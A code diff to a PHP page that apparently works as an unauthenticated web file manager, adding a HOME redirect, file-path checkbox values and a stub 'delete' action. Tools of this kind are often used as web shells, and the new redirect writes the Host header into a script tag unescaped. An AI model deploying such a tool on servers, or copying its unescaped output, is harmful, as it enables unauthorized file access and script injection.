@@ -33,7 +33,7 @@
     	background: transparent;
 	}
 	::-webkit-scrollbar-thumb {
-    	background: #FF0000;
+    	background: transparent;
 	}
 	select.select {
 		background: #242424;
@@ -46,7 +46,6 @@
 		width:100%;
 		font-family: 'Pangolin', cursive;
 		border:2px solid #d4d4d4;
-		background: transparent;
 		color: #d4d4d4;
 		resize: none;
 	}
@@ -159,6 +158,14 @@ class x {
         $this->root = $_SERVER['DOCUMENT_ROOT'];
         $this->cwd 	= $this->cwd();
         $this->cft 	= time();
+    }
+    public function home() {
+    	$this->home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
+    	if ($this->vars($this->home)) {
+    		return false;
+    	} else {
+    		$this->vars("<script>window.location='". $this->home ."'</script>");
+    	}
     }
     public function vars($x) {
     	return print($x);
@@ -315,7 +322,7 @@ foreach (scandir(getcwd()) as $key => $value) {
 					</a>
 				</td>
 				<td colspan="4" class="header">
-					HOME
+					<a href="<?= $x->home() ?>">HOME</a>
 				</td>
 			</tr>
 			<tr>
@@ -327,7 +334,7 @@ foreach (scandir(getcwd()) as $key => $value) {
 			<tr>
 				<td class="form">
 					<label class='container'>
-						<input type="checkbox" name="value[]" form="myform">
+						<input type="checkbox" name="value[]" form="myform" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
 						<span class='checkmark'></span>
 					</label>
 				</td>
@@ -365,7 +372,7 @@ foreach (scandir(getcwd()) as $key => $value) {
 		<tr>
 			<td class="form">
 				<label class='container'>
-					<input type="checkbox" name="value[]" form="myform">
+					<input type="checkbox" name="value[]" form="myform" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
 					<span class='checkmark'></span>
 				</label>
 			</td>
@@ -387,7 +394,7 @@ foreach (scandir(getcwd()) as $key => $value) {
 			</td>
 			<form method="post">
 				<td class="select">
-					<select class="select" name="act" onchange="if(this.value != '0') this.form.submit()" >
+					<select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
 						<option selected>ACTION</option>
 						<option value="edit">EDIT</option>
 					</select>
@@ -405,12 +412,30 @@ foreach (scandir(getcwd()) as $key => $value) {
 			<span class='checkmark'></span>
 		</label>
 	</td>
-	<td colspan="5">
-		<select>
-			<option selected>ACTION</option>
-		</select>
-	</td>
+	<form method="post" id="myform">
+		<td colspan="5">
+			<select name="mode" onchange="if(this.value != '0') this.form.submit()">
+				<option selected>ACTION</option>
+				<option value="delete">DELETE</option>
+			</select>
+		</td>
+	</form>
 </tr>
+<?php
+if (!empty($data = @$_POST['value'])) {
+	foreach ($data as $key => $value) {
+		switch (@$_POST['mode']) {
+			case 'delete':
+				print($value);
+				break;
+			
+			default:
+				# code...
+				break;
+		}
+	}
+}
+?>
 <script type="text/javascript">
 	function checkAll(ele) {
 		var checkboxes = document.getElementsByTagName('input');
